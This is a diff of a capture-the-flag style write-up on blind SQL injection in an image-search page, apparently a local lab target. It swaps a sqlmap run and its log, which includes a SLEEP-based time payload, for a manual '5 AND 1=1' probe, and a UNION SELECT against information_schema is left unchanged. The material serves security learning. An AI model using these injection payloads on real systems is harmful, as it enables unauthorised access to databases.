@@ -1,26 +1,16 @@
 # Blind SQL Injection in Image Search
 
 # Tools
-sqlmap, SQL injection: https://www.computersecuritystudent.com/SECURITY_TOOLS/SQL_INJECTION/lesson10/index.html
+SQL injection: https://www.computersecuritystudent.com/SECURITY_TOOLS/SQL_INJECTION/lesson10/index.html
 MD5 decoder, SHA256
 
 # How to solve it
-When running
+Started with a simple SQL injection to test if the input field returns any SQL
+code by using:
 
 ```
-python3 sqlmap.py -u "http://192.168.0.8/?page=searchimg&id=5&Submit=Submit#"
+5 AND 1=1
 ```
-it returns the following log:
-sqlmap identified the following injection point(s) with a total of 155 HTTP(s) requests:
----
-Parameter: id (GET)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: page=searchimg&id=5 AND (SELECT 8675 FROM (SELECT(SLEEP(5)))rmah)&Submit=Submit
----
-web server operating system: Linux Ubuntu
-web application technology: Nginx 1.4.6, PHP 5.5.9
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 By using
 ```5 UNION SELECT table_name, column_name FROM information_schema.columns```
